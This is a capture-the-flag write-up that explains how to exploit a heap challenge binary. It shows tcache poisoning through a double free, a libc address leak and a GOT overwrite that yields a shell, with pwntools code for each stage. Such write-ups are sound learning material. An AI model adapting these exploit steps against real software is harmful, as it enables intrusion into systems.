# cache
### slopey | 2/13/2022

TL;DR: tcache poisoning into GOT overwrite

Credits to r4kapig for the original solution.

Full exploit is [here](solve.py).

## Background

We are given a binary with the following menu:

```
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user
```

After doing some reverse engineering with Ghidra, I conclude the following:
1. malloc(0x10); the first 8 bytes is a pointer to the function `admin_info`, and the second 8 bytes is a pointer to `get_flag`.
2. malloc(0x10); allocates a 16 byte buffer for the name of user
3. calls the function at the first 8 bytes of the admin struct
4. writes to the buffer allocated by 2
5. prints the student name
6. calls free on the admin struct
7. calls free on the name buffer

Another important piece of information is that this version of LIBC does not have checks for double free. Meaning, if we call commands 1, 6, 6 (or equivalently, 2, 7, 7) we do not crash. Also, tcache is enabled.

## The Game Plan
### Stage 1: Tcache Poisoning

We use the tcache poisoning method as outlined [here](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c) in how2heap in order to obtain an arbitrary pointer to an address. We use tcache poisoning to return a pointer to the GOT entry for `free`. This allows us to set up a GOT overwrite. Here is the code: 

```python
malloc_user(b"a")
free_user()
free_user()
edit_user(p64(exe.got["free"]))
malloc_admin()
malloc_user(b"")
```
As you can see, by triggering the double free vulnerability, we use the use after free vulnerability to edit the freed chunk to return an address on the GOT table.

### Stage 2: LIBC leak
Since user is now actually a pointer to the GOT entry for free, we can simply print the user info to obtain a LIBC leak.
```python
r.sendlineafter(b"Choice: ", b"5")
r.recvline()
libc_leak = u64(b"\x20" + r.recv(5) + b"\x00\x00")
log.success(f"LIBC leak at {hex(libc_leak)}")
libc.address = libc_leak - 0x97920
log.info(f"LIBC base at {hex(libc.address)}")
```
The last byte of free is overwritten by the newline character, so I append an arbitrary byte to the data. Then, I use gdb to calculate the offset from LIBC (which is where the 0x97920 comes from). This works because the last byte of the LIBC address will always be the same. 

### Stage 3: GOT Overwrite
Finally, we simply edit the user buffer to the address of system. Then, we can simply free a buffer with name "/bin/sh" to call `system("/bin/sh")`.
```python
edit_user(p64(libc.symbols["free"]) + p64(libc.symbols["puts"]))
free_admin()
edit_user(p64(libc.symbols["system"]) + p64(libc.symbols["puts"]))
malloc_user(b"/bin/sh")
free_user()
```
You may notice that we first free admin. This is because we need a buffer on the tcache bin list that isn't corrupted. Also, we also overwrite the `puts` GOT entry because the newline character would cause a one-byte overwrite of the next GOT entry after `free`, so we need to fully overwrite the puts address with the correct entry.
